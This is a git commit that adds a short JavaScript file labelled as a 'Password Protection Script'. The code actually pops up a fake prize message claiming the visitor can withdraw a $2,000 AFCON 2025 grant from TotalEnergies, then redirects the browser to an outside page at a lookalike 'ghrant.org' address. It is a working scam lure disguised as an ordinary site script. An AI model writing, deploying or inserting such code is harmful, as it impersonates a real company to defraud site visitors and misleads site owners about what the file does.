0866cbf70656948023ba36235cea43d2dec3f552
mfednewblog8 <nsikakimoh68@gmail.com>
2026-01-02 11:46:34 +0100

    Create afcon-active.js

---
+++ afcon-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW $2,000'
+password = prompt(
+  'AFCON25: Congratulations! You are eligible to receive $2,000 AFCON 2025 Grant from The main sponsor TotalEnergies. Please press OK to withdraw CASH now.',
+  'WITHDRAW $2,000'
+);
+if (password != 'WITHDRAW $2,000') {
+  location.href = 'https://ghrant.org/afcon25.html';
+}
